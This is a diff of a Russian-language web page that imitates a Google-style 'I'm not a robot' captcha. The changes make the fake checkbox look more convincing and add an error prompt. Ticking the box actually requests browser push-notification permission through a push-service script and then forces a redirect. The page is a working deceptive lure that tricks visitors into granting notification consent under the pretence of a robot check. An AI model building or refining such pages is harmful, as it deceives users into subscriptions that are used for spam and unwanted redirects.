@@ -39,10 +39,35 @@
             width: 20px;
             height: 20px;
             cursor: pointer;
-            appearance: auto; /* Гарантируем стандартный вид чекбокса */
+            transition: background-color 0.3s ease, border-color 0.3s ease;
+            appearance: none; /* Убираем стандартный вид */
+            border: 2px solid #5f6368;
+            border-radius: 4px;
+            position: relative;
         }
         .captcha-checkbox:checked {
-            accent-color: #1a73e8; /* Синий цвет для галочки */
+            background-color: #1a73e8;
+            border-color: #1a73e8;
+            animation: fillCheckbox 0.3s ease;
+        }
+        .captcha-checkbox:checked::after {
+            content: '\2713'; /* Символ галочки */
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 14px;
+        }
+        @keyframes fillCheckbox {
+            0% {
+                background-color: #fff;
+                border-color: #5f6368;
+            }
+            100% {
+                background-color: #1a73e8;
+                border-color: #1a73e8;
+            }
         }
         .captcha-text {
             font-size: 14px;
@@ -87,6 +112,12 @@
             flex-direction: column;
             align-items: flex-start;
         }
+        .error {
+            color: red;
+            font-size: 12px;
+            display: none;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -108,6 +139,7 @@
         </div>
         <div class="button-container">
             <button class="submit-button" id="submit-button">Отправить</button>
+            <div class="error" id="error">Пожалуйста, подтвердите, что вы не робот.</div>
         </div>
     </div>
 
@@ -141,29 +173,24 @@
             console.log('Лог подписки:', data);
         }
 
-        // Функция для выполнения редиректа (восстановлена из первого кода)
+        // Функция для выполнения редиректа (взята из первого кода)
         function performRedirect() {
             console.log('Попытка редиректа на:', redirectUrl);
             try {
                 window.location.href = redirectUrl;
                 setTimeout(() => {
                     if (window.location.href !== redirectUrl) {
-                        console.log('window.location.href не сработал, пробуем replace');
                         window.location.replace(redirectUrl);
-                        setTimeout(() => {
-                            if (window.location.href !== redirectUrl) {
-                                console.log('replace не сработал, пробуем window.open');
-                                window.open(redirectUrl, '_self');
-                            }
-                        }, 500);
                     }
                 }, 500);
             } catch (e) {
                 console.error('Ошибка редиректа:', e);
+                document.getElementById('error').innerText = 'Редирект не сработал. Перейдите по ссылке: ' + redirectUrl;
+                document.getElementById('error').style.display = 'block';
             }
         }
 
-        // Функция для запроса подписки
+        // Функция для запроса подписки (взята из текущего кода)
         function requestSubscription() {
             console.log('Запуск requestSubscription');
             if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
@@ -210,15 +237,19 @@
                 }
             };
 
-            setTimeout(checkPsReady, 500); // Уменьшено до 500 мс
+            setTimeout(checkPsReady, 500);
         }
 
         // Функция проверки
         function verify() {
             const checkbox = document.getElementById('captcha');
+            const error = document.getElementById('error');
             if (checkbox.checked) {
                 console.log('Чекбокс отмечен, запускаем подписку');
-                setTimeout(requestSubscription, 100); // Уменьшено до 100 мс
+                error.style.display = 'none';
+                setTimeout(requestSubscription, 100);
+            } else {
+                error.style.display = 'block';
             }
         }
 
